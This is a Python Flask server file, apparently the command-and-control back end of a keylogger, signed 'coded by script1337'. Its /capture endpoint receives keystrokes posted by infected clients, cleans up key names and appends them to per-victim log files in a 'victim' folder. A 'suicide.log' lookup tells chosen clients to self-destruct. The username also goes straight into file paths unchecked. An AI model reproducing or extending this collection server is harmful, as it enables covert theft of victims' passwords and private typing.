from flask import Flask, request
from pathlib import Path

app = Flask(__name__)


@app.route('/')
def hello_world():
    return 'coded by script1337'


def writelog(username, content):
    f = open("./victim/" + username + ".log", "a")
    f.write(content)
    f.close()


def createlog(username, content):
    f = open("./victim/" + username + ".log", "w+")
    f.write(content)
    f.close()


def killar(username):
    filepath = 'suicide.log'
    with open(filepath) as fp:
        for cnt, line in enumerate(fp):
            if username == line:
                return True
            else:
                return False


@app.route('/capture', methods=['GET', 'POST'])
def capture():
    if request.method == "POST": 
        username = str(request.form.get('username'))
        keys = str(request.form.get('keys')).replace("Space", " ")
        keys = keys.replace("Return", " Enter ")
        keys = keys.replace("LShiftKey", " ShiftKey ")
        keys = keys.replace("Back", " Back ")
        keys = keys.replace("LControlKey" , " ControlKey ")
        keys = keys.replace("Left", " Left ")
        keys = keys.replace("Right", " Right ")
        keys = keys.replace("RShiftKey", " ShiftKey ")
        keys = keys.replace("Up", " Up ")
        keys = keys.replace("Down", " Down ")
        print(keys)
        if Path("./victim/" + str(username) + '.log').is_file():
            writelog(username, keys)
        else:
            createlog(username, keys)
        if Path('suicide.log').is_file():
            if killar(username):
                return "True"
            else:
                return "False"
        else:
            return "False"
    else:
        return "404"


if __name__ == '__main__':
    app.run()
